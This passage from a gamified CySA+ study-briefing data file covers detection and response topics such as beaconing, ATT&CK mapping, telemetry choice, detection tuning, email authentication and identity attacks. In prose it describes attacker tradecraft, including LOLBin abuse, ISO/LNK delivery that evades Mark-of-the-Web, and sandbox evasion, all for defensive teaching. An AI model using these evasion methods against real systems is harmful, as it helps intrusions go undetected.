{ h: "Why acting before scoping is the single most common wrong answer", b: "A recurring exam trap offers you two tempting-but-wrong first moves once you have a confirmed indicator: immediately BLOCKING the malicious domain, or immediately REIMAGING the first infected host you found. Both feel proactive, and both are wrong as a FIRST step, for the same underlying reason -- they treat containment as if it were scoping. Blocking a domain stops that one communication channel, but you still have no idea how many other hosts are infected, so you have not actually scoped anything -- you have only tipped off a still-undiscovered attacker that their infrastructure just went dark. Reimaging the first host you find is even more costly: it destroys the evidence on that host before you have learned everything it could tell you (was it patient zero, or itself a victim of lateral movement from somewhere else), and it does absolutely nothing about however many other infected hosts are still sitting there, undetected, doing damage. The correct order is always: scope broadly first (flow/proxy across the full retention window), THEN decide on containment for everything you found, THEN remediate." },
{ h: "Full worked case study: putting every piece together", b: "Let's run the whole case end to end, the way it would actually unfold on shift. 09:11 -- a finance workstation's proxy log shows repeating five-minute connections of near-identical size to sync-cdn[.]net. You recognize the beacon signature instantly: fixed interval, uniform size, one destination. That is your NETWORK indicator. 09:14 -- pulling EDR on that host, you find WINWORD.EXE spawned powershell.exe with an encoded argument three minutes before the first beacon, right after invoice_Q3.docm was opened. That is your HOST indicator, and it also tells you HOW the beacon got there: a malicious macro. 09:20 -- you check whether this user's identity shows anything unusual and find a login from an unexpected country twenty minutes ago with 'MFA previously satisfied' -- meaning the attacker is not just running code on the endpoint, they have ALSO stolen and are actively replaying this user's session token. That is your IDENTITY indicator, and it tells you the attacker has account-level access too, not just endpoint access. 09:25 -- rather than immediately reimaging this one machine, you pivot on the sync-cdn[.]net domain across ninety days of flow and proxy logs and discover six OTHER hosts have quietly beaconed to the same domain over the past two weeks -- your true scope is seven machines, not one. Only now, with the full scope known, do you move to containment: isolate all seven hosts, revoke the stolen session token (a password reset alone would not evict a live token), and begin the takedown. Every single decision in that timeline traces back to a technique covered in this briefing -- that is not a coincidence, it is the whole point of studying it this way." },
{ h: "Self-check before you move to the Training Sim", b: "Before you leave this briefing, you should be able to answer each of the following without looking back: What exact combination of facts proves beaconing, and why is byte size alone not enough? What is the one-sentence test that tells DNS tunneling apart from a DGA? Why does Word spawning encoded PowerShell matter more than the fact that PowerShell is running at all? Why can a clean antivirus scan coexist with a live, real infection? What single phrase in an MFA log entry proves token theft instead of a cracked password? What is the data-shape difference between a spray, a brute force, an MFA fatigue attack, and credential stuffing? Why do you reach for flow and proxy logs before PCAP when scoping an incident? If any of those feel shaky, re-read that specific section now -- the Training Sim will test every one of them directly." },
],
traps: [
"A single 'malicious IP' hit is WEAKER evidence than a behavioral PATTERN (periodicity, lineage) -- the exam rewards recognizing the pattern over trusting a reputation lookup alone.",
"Big data transfers are not automatically exfiltration; a normal 90KB page load is routine. Direction, destination, and pattern matter far more than raw size.",
"Encoded PowerShell alone is not proof of compromise -- legitimate management tooling encodes commands too. The PARENT PROCESS and its launch context (a Word doc that just opened) are what make it malicious.",
"'Impossible travel' questions that jump straight to 'password was compromised' miss the real answer when MFA shows 'previously satisfied' on the second login -- that phrase is the tell for SESSION TOKEN theft/replay, not a fresh credential compromise.",
"Don't confuse DNS tunneling (one domain, many unique encoded subdomains, all resolving) with a DGA (many different domains, mostly failing to resolve) -- they are opposite shapes solving different attacker problems.",
"Password spray (many accounts, few attempts each) is the INVERSE of brute force (few accounts, many attempts) -- read the ratio in the data, don't just see 'failed logins' and guess.",
"A clean antivirus disk scan does NOT clear a host if EDR shows a live, active connection -- that combination points to FILELESS malware living only in memory, which disk scans cannot see by design.",
"When scoping an incident, reach for flow/proxy logs FIRST (long retention, broad view) -- reaching for a short PCAP window or acting (blocking/reimaging) before scoping are both classic wrong answers." ],
keys: [
"Beaconing = fixed time interval + near-identical byte size + one destination -- all three together, not any single one.",
"DNS tunneling = one domain, many unique high-entropy subdomains, real resolution. DGA = many different domains, mostly NXDOMAIN.",
"Judge a process by its PARENT and launch context, never by its name alone -- LOLBins (powershell, certutil, wscript, rundll32, mshta) are legitimate tools abused precisely because they're trusted.",
"Impossible travel + 'MFA previously satisfied' = stolen session token being replayed, not a cracked password. A password reset alone will not evict it.",
"Spray = many accounts, few attempts each, one source. Brute force = few accounts, many attempts. MFA fatigue = repeated push prompts, no password guessing. Credential stuffing = breached pairs tried once each.",
"A live EDR-observed C2 connection outweighs a clean AV disk scan -- that combination is fileless malware living in memory.",
"Cloud compromise is usually proven by a COMBINATION of fields (dormant account + unexpected source + bulk action), never one field alone.",
"To scope an incident, pivot with flow/proxy logs first (broad, long retention); use PCAP only to prove payload content on an already-identified host. Scope before you contain.",
"Every conclusion should trace to a specific, exact log line you can point at." ],
video: { title: "CompTIA CySA+ (CS0-004) Domain 1: Security Operations -- full course", url: "https://www.youtube.com/watch?v=gyE8di5QPfQ", note: "Optional. This is a full, several-hours-long domain course covering all of Security Operations, not just this one topic. Nothing in it is required to master this briefing -- watch it only if you want a longer-form second pass." } },
"cysa-ops-2": { intro: "Commander Nebula: 'Knowing the enemy's playbook, Ranger, is worth a squadron.' Read this once and the tactic/technique split, the Pyramid of Pain, and hypothesis-driven hunting will never trip you up again.",
sections: [
{ h: "ATT&CK structure: tactics (the WHY) vs. techniques (the HOW)", b: "MITRE ATT&CK organizes every known adversary behavior into two layers, and the exam constantly tests whether you can tell them apart. A TACTIC is the adversary's GOAL -- the WHY. There are 14 enterprise tactics you should recognize by name: Reconnaissance, Resource Development, Initial Access, Execution, Persistence, Privilege Escalation, Defense Evasion, Credential Access, Discovery, Lateral Movement, Collection, Command and Control, Exfiltration, and Impact. A TECHNIQUE is the specific METHOD used to achieve that goal -- the HOW -- identified by a code like T1566 (Phishing) or T1071 (Application Layer Protocol). When a question describes a behavior and asks you to classify it, decide FIRST whether it's asking for the goal (tactic) or the method (technique), then match: ransomware encrypting files for extortion = Impact tactic, specifically T1486 (Data Encrypted for Impact). HTTPS-based check-ins to blend into normal traffic = Command and Control tactic, specifically T1071.001 (Web Protocols). An attacker using a stolen RDP session to reach a second host = Lateral Movement tactic, specifically T1021.001 (Remote Desktop Protocol). Persistence explains SURVIVING A REBOOT (e.g., a scheduled task); it does NOT explain ongoing check-ins -- don't map beaconing to Persistence.", data: "Ransomware encrypting files -> TACTIC: Impact | TECHNIQUE: T1486\nHTTPS beaconing to blend in -> TACTIC: Command and Control | TECHNIQUE: T1071.001\nStolen RDP session to a 2nd host -> TACTIC: Lateral Movement | TECHNIQUE: T1021.001\nScheduled task surviving reboot -> TACTIC: Persistence | TECHNIQUE: T1053" },
{ h: "The Pyramid of Pain: why some indicators hurt attackers more than others", b: "David Bianco's Pyramid of Pain ranks indicator types by how COSTLY they are for an attacker to change, from easiest (bottom) to hardest (top): HASH VALUES (trivial -- recompile the file, hash changes instantly) -> IP ADDRESSES (easy -- switch servers) -> DOMAIN NAMES (more costly, but still manageable) -> NETWORK/HOST ARTIFACTS (harder -- specific URI patterns, registry keys, named pipes) -> TOOLS (hard -- replacing Cobalt Strike or Mimikatz requires real re-tooling) -> TTPs / BEHAVIORS (hardest of all -- this is the adversary's fundamental methodology). Blocking a single hash inconveniences an attacker for seconds. Building a detection for a BEHAVIOR (e.g., 'Office application spawning a script interpreter') hurts every single intrusion that relies on that behavior, regardless of which specific tool or infrastructure is used. When the exam asks which indicator type gives the MOST DURABLE, highest-value detection, the answer is always TTPs/behaviors -- never a hash or an IP." , svg: `<svg viewBox="0 0 640 380" xmlns="http://www.w3.org/2000/svg" style="width:100%;height:auto;max-width:640px;display:block;margin:0 auto;">
<polygon points="320,10 470,80 170,80" fill="#D64545" stroke="#fff" stroke-width="2"/>
<text x="320" y="52" text-anchor="middle" font-family="monospace" font-size="13" fill="#fff">TTPs</text>
<polygon points="170,80 470,80 520,140 120,140" fill="#C8722E" stroke="#fff" stroke-width="2"/>
<text x="320" y="118" text-anchor="middle" font-family="monospace" font-size="13" fill="#fff">TOOLS</text>
<polygon points="120,140 520,140 560,200 80,200" fill="#C8901A" stroke="#fff" stroke-width="2"/>
<text x="320" y="178" text-anchor="middle" font-family="monospace" font-size="13" fill="#fff">NETWORK / HOST ARTIFACTS</text>
<polygon points="80,200 560,200 595,260 45,260" fill="#8C9A2E" stroke="#fff" stroke-width="2"/>
<text x="320" y="238" text-anchor="middle" font-family="monospace" font-size="13" fill="#fff">DOMAIN NAMES</text>
<polygon points="45,260 595,260 625,320 15,320" fill="#3E9B4F" stroke="#fff" stroke-width="2"/>
<text x="320" y="298" text-anchor="middle" font-family="monospace" font-size="13" fill="#fff">IP ADDRESSES</text>
<polygon points="15,320 625,320 640,370 0,370" fill="#2E6DB4" stroke="#fff" stroke-width="2"/>
<text x="320" y="352" text-anchor="middle" font-family="monospace" font-size="13" fill="#fff">HASH VALUES</text>
<text x="320" y="15" text-anchor="middle" font-family="monospace" font-size="10" fill="#6A3FA0">HARDEST FOR ATTACKER TO CHANGE (highest value)</text>
</svg>` },
{ h: "Evaluating threat intelligence quality", b: "Not all threat intel is equally useful, and you must judge it on RELIABILITY (is the source credible and accurate), CONFIDENCE (how certain is the assessment), TIMELINESS (how fresh is it), and RELEVANCE (does it actually apply to your environment/sector). CTI also comes in four LEVELS, from most abstract to most concrete: STRATEGIC (high-level trends for leadership -- 'ransomware targeting your sector is rising'), OPERATIONAL (specific campaigns and threat actor groups), TACTICAL (the TTPs defenders can build detections from), and TECHNICAL (raw indicators of compromise -- IPs, hashes, domains -- which have the SHORTEST shelf life since they sit at the bottom of the Pyramid of Pain). When comparing two intel reports, one offering a list of month-old IP addresses versus one describing a targeted actor's TTPs against your industry, the TTP report wins on both relevance and durability -- stale IPs have likely already been rotated away from." },
{ h: "Hypothesis-driven threat hunting", b: "The defining trait of HUNTING (as opposed to reactive incident response) is that it starts from a HYPOTHESIS, not an alert. A well-formed hunting hypothesis is FALSIFIABLE and tied to a specific data source: 'If an actor used T1053 (Scheduled Task) for persistence, we would expect to see schtasks.exe creation events outside our normal deployment windows.' You then query for that expected evidence, refine the query, and reach one of two outcomes -- both valuable. If you FIND evidence, you've caught something real. If you find NOTHING after a thorough search, that still INCREASES CONFIDENCE in your coverage for that technique -- a clean, validated hunt is not wasted effort, it's assurance. Either way, a hunt that proves productive should be PROMOTED into a permanent, automated detection rule -- hunting should always leave the SOC better than it found it, win or lose.", data: "Hypothesis: 'T1053 persistence would show schtasks.exe creation outside deployment windows'\n  -> Query: schtasks.exe creation events, filter to non-deployment hours\n  -> Findings: none this time\n  -> Outcome: coverage confidence increased; hunt logic saved as a candidate detection" },
{ h: "A note on attribution", b: "Commodity tools (widely available malware, off-the-shelf frameworks) are used by countless unrelated actors, so seeing a common tool does NOT reliably identify WHO is behind an attack. Responsible attribution requires weighing multiple, corroborating pieces of evidence (infrastructure reuse, unique TTPs, targeting patterns) -- and for a SOC's immediate response decisions, precise attribution is usually out of scope entirely. Your job is to detect, contain, and remediate the behavior in front of you; formal attribution is a separate, specialized, evidence-heavy exercise typically owned by threat intelligence teams, not something to guess at mid-incident." },
],
traps: [
"Tactic vs. technique swap is the single most common trap: 'Command and Control' is the TACTIC (the goal); 'T1071 Web Protocols' is the TECHNIQUE under it (the method). Read carefully which one the question is actually asking for.",
"Persistence explains SURVIVING A REBOOT; it does not explain ongoing check-ins to a C2 server -- don't map beaconing behavior to the Persistence tactic.",
"Exfiltration requires ACTUAL EVIDENCE of data leaving (large outbound transfer, unusual destination) -- small, heartbeat-sized beacon traffic is not exfiltration just because data is technically moving.",
"'Most durable/highest-value indicator to detect' always means TTPs/behaviors on this exam -- never a hash or an IP, no matter how the question is worded.",
"Don't assume a common/commodity tool identifies a specific attacker -- attribution requires corroborating evidence and is usually outside the SOC's immediate response scope anyway." ],
keys: [
"Tactic = the adversary's GOAL (why); technique = the specific METHOD (how). Know the 14 enterprise tactic names.",
"Pyramid of Pain, easiest-to-hardest for an attacker to change: hash -> IP -> domain -> network/host artifact -> tool -> TTP. TTP detections hurt attackers most and last longest.",
"CTI value = reliability x relevance x freshness; TTP-level (tactical) intel outlasts technical-level IOCs.",
"Hunting is hypothesis-driven and falsifiable, tied to a specific data source -- not a blind search.",
"A hunt that finds nothing still has value: it raises confidence in coverage. A hunt that finds something should become a permanent detection rule.",
"Commodity tool use does not equal attribution; attribution needs corroborating evidence and is usually a separate function from SOC response." ],
video: { title: "MITRE ATT&CK Framework Explained | Cyber Attack Lifecycle, Tactics & Techniques (Complete Guide)", url: "https://www.youtube.com/watch?v=16ZvTnAlKeI", note: "A complete walkthrough of the ATT&CK matrix, tactics vs techniques, and how analysts use the framework day to day." },
},

"cysa-ops-3": { intro: "The Hornet Swarm scatters its trail across packets, processes, and encrypted tunnels. Read this once and you'll know exactly which telemetry source answers which question -- and in what order to capture it.",
sections: [
{ h: "Choosing the right telemetry source for the question being asked", b: "This topic is tested almost entirely as 'given this specific need, which data source answers it.' Learn these mappings cold: FLOW DATA (NetFlow/IPFIX) is cheap to store and retained for a LONG time (often 90 days), making it the best tool for broad, long-horizon SCOPING questions -- 'who talked to this IP over the last two months.' It does NOT contain payload content, only metadata (source, destination, ports, byte counts, timing). PROXY LOGS are similar -- broad, retained a while, good for web-destination scoping, but again no full payload. Full PACKET CAPTURE (PCAP) is the ONLY source that preserves actual PAYLOAD CONTENT -- what was actually said/sent -- but it is expensive to store and usually only kept for a short ROLLING window (e.g., 48 hours), so it answers 'what exactly was sent' on a host you've already identified, not 'who else was affected' over a long period." },
{ h: "Encrypted traffic: what you can still see without decrypting it", b: "A frequent exam trap implies that encryption (TLS/HTTPS) makes network detection impossible. It does not. Encryption hides the PAYLOAD CONTENT, but it does NOT hide BEHAVIOR: you can still observe beaconing intervals, connections to rare or newly-registered destinations, unusual traffic VOLUME for a host's role, and TLS/JA3 FINGERPRINTING (the specific way a client negotiates TLS can fingerprint the software making the connection, often revealing malware tooling even though the payload itself stays encrypted). The correct exam answer to 'what can you detect without decrypting traffic' is behavioral/metadata analysis -- not 'nothing, because it's encrypted.'" },
{ h: "Network scanning and enumeration patterns", b: "One host suddenly connecting to many other hosts across a subnet on administrative ports (e.g., 22, 135, 445, 3389) in a short window is a SWEEP/ENUMERATION pattern -- the adversary mapping out what else exists on the network before deciding where to move next. This maps to the DISCOVERY tactic in ATT&CK, technique T1046 (Network Service Discovery). Recognize this shape (one source, many destinations, admin ports, short timeframe) as distinct from beaconing (one source, ONE destination, repeated over a long time)." },
{ h: "Order of volatility: what to capture first during live response", b: "When collecting evidence from a live, running system, you must capture data in order from MOST volatile (disappears soonest, often the instant power is lost) to LEAST volatile (survives on disk). The standard order every CySA+ candidate must memorize: (1) CPU registers and cache, (2) RAM / running processes and network connections, (3) temporary file systems / swap space, (4) data on DISK (files, logs), (5) remote logging / archived data, (6) physical configuration / network topology (least volatile). The critical, exam-tested principle: ALWAYS capture RAM (a memory dump) BEFORE anything that persists on disk, because powering off or even just letting time pass loses volatile evidence permanently -- disk data will still be there later, but memory contents will not.", data: "ORDER OF VOLATILITY (capture first -> last):\n1. CPU registers/cache\n2. RAM (running processes, open network connections, injected memory)\n3. Temporary filesystems / swap\n4. Disk data (files, logs)\n5. Remote logging / archived data\n6. Physical/network topology documentation" },
{ h: "Living-off-the-land abuse in network/endpoint telemetry", b: "certutil.exe (a legitimate Windows certificate utility) being invoked with URL-fetch flags to download a remote file is a textbook LOLBin abuse pattern -- it is signed, trusted, and present on every Windows host, which is exactly why attackers prefer it over dropping their own custom downloader. Seeing services.exe (a core Windows process) spawn cmd.exe, which then spawns certutil.exe reaching out to an external URL, is an alarming lineage chain precisely because services.exe -> cmd.exe is NOT routine, ordinary process lineage -- legitimate service operations don't typically drop into a command shell like that." },
{ h: "Threat intelligence placement: external vs. internal feeds", b: "There's a practical tradeoff in WHERE you deploy threat intelligence collection. EXTERNAL threat intel (commercial feeds, OSINT, ISACs) gives you broad, general 'threat weather' -- what's happening across the industry -- but it isn't tailored to your specific environment. INTERNAL threat intelligence (derived from your own SOC's incidents, your own hunts, your own environment's baseline) gives you ACTIONABLE, ATTRIBUTED events specific to what's actually happening to YOU. The correct exam framing is that these serve different, complementary purposes -- many mature organizations deploy BOTH rather than treating it as an either/or choice." },
],
traps: [
"Flow data and proxy logs are for broad, long-window SCOPING (no payload content); PCAP is for proving exact PAYLOAD CONTENT but only over a short retention window -- pick based on which question you're answering.",
"Encryption hides payload content, not behavior -- beaconing intervals, rare destinations, traffic volume, and TLS/JA3 fingerprints remain detectable without decryption. 'You can't detect anything in encrypted traffic' is always the wrong answer.",
"One host sweeping many destinations on admin ports in a short window is Discovery/enumeration (T1046) -- don't confuse this shape with beaconing (one source, ONE destination, over a long period).",
"Order of volatility: RAM must be captured BEFORE disk data -- disk data persists, memory does not. Getting this order backwards is a classic wrong-answer trap.",
"certutil.exe, rundll32.exe, mshta.exe, and wscript.exe are legitimate SIGNED tools being abused (LOLBins) -- their mere presence proves nothing; the parent process and unusual arguments/destination do.",
"External and internal threat intelligence are complementary, not competing -- don't pick one as universally 'better' when a question asks about deploying threat intel sources." ],
keys: [
"Flow/proxy data = broad, long retention, metadata only, best for scoping. PCAP = short retention, full payload, best for proving exact content on a known host.",
"Encrypted traffic still reveals behavior: beaconing patterns, rare destinations, volume anomalies, and TLS/JA3 fingerprints.",
"One host -> many destinations on admin ports in a short window = Discovery/enumeration (T1046), not beaconing.",
"Order of volatility: CPU/cache -> RAM -> temp/swap -> disk -> remote logs -> physical config. Capture RAM before disk.",
"LOLBins (certutil, rundll32, mshta, wscript) are legitimate tools abused for their trust -- judge by parent process and arguments, not the binary name.",
"External CTI = broad threat weather; internal CTI = actionable, attributed to your own environment. Mature SOCs use both." ],
video: { title: "CompTIA CySA+ (CS0-004) Domain 1: Security Operations", url: "https://www.youtube.com/watch?v=gyE8di5QPfQ", note: "This full-domain walkthrough also covers network and endpoint telemetry analysis." },
},

"cysa-ops-4": { intro: "The Swarm wins by burying you in noise. Read this once and you'll know exactly how to tune detections, validate your tuning, and reason about the AI now sitting inside your SIEM -- without ever losing coverage.",
sections: [
{ h: "Tuning a noisy detection: the correct technique", b: "When a detection rule generates excessive false positives, the correct response is TARGETED TUNING -- adding COMPOUND, NARROW exceptions for the specific known-benign pattern causing the noise (e.g., excluding a specific known-benign service account AND a specific known-benign process path together, rather than a broad blanket exclusion), adjusting thresholds, or refining the underlying query logic. NEVER simply DISABLE a noisy detection outright -- that creates a permanent BLIND SPOT and removes coverage entirely, including for the rare true positives the rule might still catch. A tight, compound exception preserves detection for everything except the precise benign pattern you've proven is safe." },
{ h: "The first thing to check when timelines look impossible", b: "If log timestamps across different systems suggest an event happened before its supposed cause (an 'impossible' timeline), the FIRST thing to verify -- before reaching for exotic theories about attacker timestomping or anti-forensics -- is CLOCK SYNCHRONIZATION (NTP) across your log sources. Unsynchronized clocks between a firewall, an endpoint, and a SIEM are overwhelmingly the most common cause of a timeline that doesn't add up, and it's a quick, boring check that should happen before anything more elaborate." },
{ h: "Fixing an overwhelming analyst-to-alert ratio", b: "When a SOC faces an extreme workload imbalance (e.g., a 900:1 alert-to-analyst ratio) the highest-impact investment is SOAR (Security Orchestration, Automation, and Response). SOAR directly attacks the ratio problem by automatically ENRICHING alerts with context, CORRELATING related events into single cases, and auto-CLOSING known-benign patterns before a human ever has to look at them -- freeing analyst time for the alerts that actually need judgment. This is a different tool from a SIEM (which detects/correlates) or an EDR (which is endpoint-focused); SOAR's specific value is orchestrating and automating the RESPONSE workflow itself." },
{ h: "How to validate that tuning actually worked", b: "After tuning a detection to reduce noise, you must PROVE it still catches real threats -- passively waiting to see if alerts quiet down cannot distinguish between 'the tuning worked and it's genuinely quiet' and 'the tuning broke detection and you're now blind.' The correct validation step is to TEST the tuned rule against a KNOWN-BAD sample or a controlled simulation (e.g., a purple-team exercise or a benign reproduction of the original triggering behavior) to confirm the rule still fires when it should. Tuning without this validation step is unproven and risky." },
{ h: "Machine-learning baseline poisoning", b: "Self-training, continuously-learning ML-based detection models can be POISONED by a SLOW-ROLL attacker: if malicious behavior is introduced gradually enough, the model may quietly incorporate it into its definition of 'normal,' causing it to stop flagging that behavior over time. The defense against this is HOLDOUT VALIDATION (testing the model against a fixed, uncorrupted reference dataset periodically) and requiring HUMAN REVIEW of what the model is learning, rather than allowing it to retrain fully autonomously and unsupervised forever." },
{ h: "Handling AI-generated alert summaries and correlation", b: "Generative AI tools that summarize alerts or draft incident narratives are USEFUL LEADS, but they are NOT EVIDENCE on their own -- every specific factual claim an AI summary makes must be independently traced back to and confirmed against the actual underlying log line. Partial hallucination (some details correct, others fabricated or subtly wrong) is the STANDARD failure mode for these tools, not a rare edge case, so treat AI output the same way you'd treat an unverified tip: a starting point for investigation, never the final word." },
{ h: "The architectural prerequisites for reliable cross-source correlation", b: "A correlation rule that spans multiple log sources (e.g., matching a firewall event to an endpoint event to an identity event) is only as reliable as three underlying prerequisites: COMPLETE INGESTION (all the relevant sources are actually being collected, with no silent gaps), a COMMON, SYNCHRONIZED TIME reference across all sources (see the clock-sync point above), and CONSISTENT FIELD PARSING/NORMALIZATION (the same conceptual field -- like 'source IP' -- must be parsed into a common schema across different log formats so the correlation engine can actually match on it). Without these three, a correlation rule will silently miss matches or, worse, correlate the wrong events." },
{ h: "The right way to frame a false-positive-vs-detection tradeoff", b: "When leadership questions why a detection rule produces false positives, frame the tradeoff correctly: MEAN TIME TO DETECT (MTTD) is the outcome metric that actually matters for security posture, while false-positive VOLUME is a tunable, manageable COST of achieving that detection speed. The right response to noise is TARGETED TUNING (see above), never wholesale rollback of the detection -- rolling back trades away real detection capability just to reduce analyst annoyance, which is the wrong tradeoff." },
],
traps: [
"Fixing noise means adding NARROW, COMPOUND exceptions or adjusting thresholds/logic -- disabling the rule entirely is always the wrong answer because it creates a permanent blind spot.",
"When timestamps across systems look impossible, check CLOCK SYNCHRONIZATION (NTP) FIRST -- it's the overwhelmingly common cause, not exotic anti-forensic timestomping.",
"For an extreme alert-to-analyst ratio, the highest-impact fix is SOAR (automated enrichment/correlation/closure) -- not simply hiring more analysts or further reducing detection coverage.",
"Tuning must be VALIDATED against a known-bad sample or simulation -- passively waiting to see if things go quiet cannot tell you whether you're safe or blind.",
"Continuously self-training ML models can be POISONED by a slow-roll attacker normalizing malicious behavior into the baseline -- guard with holdout validation and human review, don't trust unsupervised retraining forever.",
"AI-generated alert summaries are leads, not evidence -- every claim needs independent log-line confirmation; partial hallucination is the STANDARD failure mode, not rare.",
"Cross-source correlation rules are only as good as complete ingestion, synchronized time, and consistent field parsing -- missing any one of these breaks correlation silently.",
"MTTD is the outcome metric; false-positive volume is a tunable cost. The answer to noise is targeted tuning, never wholesale detection rollback." ],
keys: [
"Tune noisy rules with narrow, compound exceptions or threshold/logic adjustments -- never disable a detection outright.",
"Check clock synchronization (NTP) FIRST when timelines look impossible.",
"SOAR is the highest-impact fix for an overwhelming alert-to-analyst ratio (auto-enrich, correlate, close known-benign).",
"Validate tuning against known-bad samples/simulations -- don't just wait and hope.",
"ML models can be poisoned by slow-roll attacks; use holdout validation and human review to guard against it.",
"AI summaries are leads requiring independent log-line verification -- partial hallucination is standard, not rare.",
"Reliable correlation needs complete ingestion + synchronized time + consistent field parsing, all three.",
"MTTD is the outcome that matters; false-positive volume is a manageable cost -- tune targeted, don't roll back wholesale." ],
video: { title: "CompTIA CySA+ (CS0-004) Domain 1: Security Operations", url: "https://www.youtube.com/watch?v=gyE8di5QPfQ", note: "This full-domain walkthrough also covers SIEM/EDR detection engineering and tuning." },
},

"cysa-ops-5": { intro: "The Swarm's favorite hiding place is your inbox. Read this once and you'll be able to spot every email, web, and identity deception it tries -- DMARC gaps, homoglyphs, AiTM, and all.", 
sections: [
{ h: "DMARC policy levels: why a spoofed email still arrived", b: "DMARC (Domain-based Message Authentication, Reporting and Conformance) has THREE distinct policy levels, and confusing them is a classic exam trap: p=none COLLECTS REPORTS about failing messages but takes NO enforcement action -- a spoofed email under a p=none policy will still be DELIVERED to the inbox. p=quarantine sends failing messages to spam/junk. p=reject BLOCKS failing messages outright. If a question describes a convincing spoofed email that was still delivered despite the domain 'having DMARC,' the explanation is almost always that the policy is set to p=none -- monitoring only, no enforcement -- not that DMARC failed to work.", data: "p=none       -> reports collected, message STILL DELIVERED (monitoring only)\np=quarantine -> message sent to spam/junk\np=reject     -> message BLOCKED entirely" },
{ h: "Constructing and spotting Business Email Compromise (BEC)", b: "The classic BEC construction combines TWO subtle deceptions at once: an ENVELOPE/DISPLAY-NAME DIVERGENCE (the display name shown to the user says 'CEO Jane Smith' but the underlying envelope-from/return-path address is something entirely different) PLUS a HOMOGLYPH or lookalike REPLY-TO address (a domain that looks nearly identical to the real one at a glance -- substituting a lowercase 'l' for a capital 'I', or a zero for the letter 'O'). Seeing BOTH of these together -- a mismatched display identity and a lookalike reply-to -- is the strongest, most specific indicator of a targeted BEC attempt, stronger than either deception alone." },
{ h: "Reading domains correctly: lookalike and deceptive domains", b: "Attackers exploit the fact that people read domains left-to-right and get fooled by the FRONT of a long domain string. The correct way to identify the true, REGISTRABLE domain is to read RIGHT-TO-LEFT starting from the top-level domain (TLD): in a domain like login.company-com.portal-auth.xyz, the actual registrable domain is portal-auth.xyz -- everything before that ('login.company-com') is just subdomain window-dressing designed to make it LOOK like it belongs to 'company-com' at a glance. Always identify the TLD first, then work backward to find the real registered domain." },
{ h: "Malware delivery evolution: why ISO/LNK files replaced Office macros", b: "After organizations widely started blocking Office macros by default (via Attack Surface Reduction rules and default macro-blocking policies), attackers PIVOTED to ISO, LNK (shortcut), and OneNote-based delivery chains specifically because these file types can EVADE Mark-of-the-Web (MOTW) BASED PROTECTIONS -- MOTW is the flag Windows applies to files downloaded from the internet that triggers extra warnings/restrictions, and certain container formats like ISO don't propagate that flag to the files extracted from inside them the same way. Recognize ISO/LNK/OneNote attachment chains as a direct, deliberate response to macro-blocking defenses, not a random change in attacker preference." },
{ h: "Remediating a stolen session: why resetting the password is not enough", b: "When an attacker has stolen and is actively using a valid SESSION TOKEN (as opposed to just a password), the FIRST and most important remediation action is to explicitly REVOKE/INVALIDATE the active session(s) and tokens. Simply resetting the user's password does NOT evict an attacker who is already using a live, valid session token -- the token remains valid independently of the password until it is explicitly revoked or expires. Password reset alone is a necessary but insufficient step; session/token revocation is what actually removes the attacker's access." },
{ h: "FIDO2: the defense that specifically defeats Adversary-in-the-Middle (AiTM) phishing", b: "Traditional MFA methods (SMS codes, push notifications, even TOTP codes) can be defeated by an ADVERSARY-IN-THE-MIDDLE (AiTM) phishing PROXY -- a fake login page that sits between the victim and the real site, relaying the victim's credentials AND their MFA response in real time to the attacker, who uses it immediately on the real site. FIDO2 (WebAuthn/passkeys) specifically defeats this because the cryptographic authentication is BOUND TO THE ORIGIN (the actual website domain) at the protocol level -- a FIDO2 credential registered for the real site simply will not complete authentication on an AiTM proxy's different domain, no matter how convincing the fake page looks visually. This origin-binding is the single specific property that makes FIDO2 the recommended upgrade over traditional MFA for defeating AiTM." },
{ h: "Sandbox evasion in malware analysis", b: "When a suspicious file is detonated in an automated sandbox and comes back with a NEGATIVE (benign) verdict, that result is not automatically trustworthy on its own -- modern malware routinely uses SANDBOX EVASION techniques such as SLEEP TIMERS (staying dormant during the sandbox's typical short analysis window) and ENVIRONMENT CHECKS (detecting virtualization artifacts, lack of user activity, or specific sandbox indicators and refusing to detonate its payload if it suspects it's being analyzed). A negative dynamic-analysis result needs CORROBORATION from other sources (static analysis, reputation data, behavioral telemetry from real endpoints) before being trusted as proof the file is safe." },
{ h: "Distinguishing MFA fatigue (prompt bombing) from token replay", b: "These two identity attacks are often confused but require DIFFERENT fixes: MFA FATIGUE / PROMPT BOMBING is the attacker (who already has a valid password) repeatedly triggering push notifications, hoping the exhausted or annoyed user eventually taps 'Approve' -- the fix is number-matching MFA, rate-limiting push prompts, or requiring additional context in the approval screen. TOKEN REPLAY is the attacker using a STOLEN, already-valid session token to skip the authentication challenge ENTIRELY -- there is no prompt to fatigue the user with at all, since the attacker isn't triggering new authentication, they're reusing an old valid one. The fix for token replay is token binding, shorter token lifetimes, and conditional access policies that detect anomalous session use -- not stronger MFA prompts, which token replay bypasses completely." },
],
traps: [
"A domain 'having DMARC' does not mean spoofed mail is blocked -- p=none only collects reports and still DELIVERS the message. Only p=quarantine or p=reject actually enforce anything.",
"The strongest BEC signal is envelope/display-name divergence COMBINED WITH a homoglyph reply-to domain -- not either deception alone.",
"Always read a suspicious domain RIGHT-TO-LEFT from the TLD to find the true registrable domain -- long, official-looking subdomain prefixes are deliberate misdirection.",
"ISO/LNK/OneNote delivery chains are a direct, deliberate evolution AWAY from Office macros specifically to evade Mark-of-the-Web protections -- not a random attacker preference shift.",
"A password reset alone does NOT evict an attacker holding a stolen, active session token -- you must explicitly revoke/invalidate the session/token itself.",
"FIDO2 defeats AiTM phishing specifically because it's bound to the origin/domain at the protocol level -- other MFA methods (SMS, push, even TOTP) can still be relayed through a convincing proxy.",
"A clean/benign sandbox verdict is not automatically trustworthy -- malware routinely uses sleep timers and environment checks to evade automated dynamic analysis; corroborate with other sources.",
"MFA fatigue (repeated push prompts hoping for an accidental approval) and token replay (reusing a stolen valid session, no prompt involved at all) are different attacks requiring different fixes -- don't conflate them." ],
keys: [
"DMARC: p=none (report only, still delivered) < p=quarantine (spam folder) < p=reject (blocked).",
"BEC's strongest signal is display-name/envelope divergence PLUS a homoglyph reply-to domain, together.",
"Read domains right-to-left from the TLD to find the true registrable domain; ignore misleading subdomain prefixes.",
"ISO/LNK/OneNote chains exist specifically to evade Mark-of-the-Web after macro-blocking became standard.",
"Stolen session tokens require explicit revocation -- a password reset alone does not evict an attacker with a live token.",
"FIDO2 defeats AiTM because authentication is cryptographically bound to the real site's origin.",
"A benign sandbox verdict needs corroboration -- sleep timers and environment checks let malware evade automated analysis.",
